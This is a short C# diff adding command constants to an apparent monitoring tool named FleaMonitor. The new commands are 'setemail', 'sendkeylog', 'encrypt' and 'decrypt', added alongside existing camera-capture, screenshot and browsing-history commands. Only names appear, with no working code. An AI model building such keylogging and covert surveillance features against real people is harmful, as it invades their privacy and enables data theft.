@@ -30,6 +30,10 @@ namespace FleaMonitor.Auxiliary
         public const string GET_CAMERA_CAPTURE_COMMAND = "camera";
         public const string RESTART_COMMAND = "restart";
         public const string LOCK_SCREEN_COMMAND = "lockscreen";
+        public const string SETEMAIL_COMMAND = "setemail";
+        public const string SEND_KEYLOG_COMMAND = "sendkeylog";
+        public const string ENCRYPT_COMMAND = "encrypt";
+        public const string DECRYPT_COMMAND = "decrypt";
 
         private static readonly string SCREENSHOT_FILENAME = "screenshot.png";
         private static readonly string BROWSING_HISTORY_FILENAME = "browsing_history.txt";
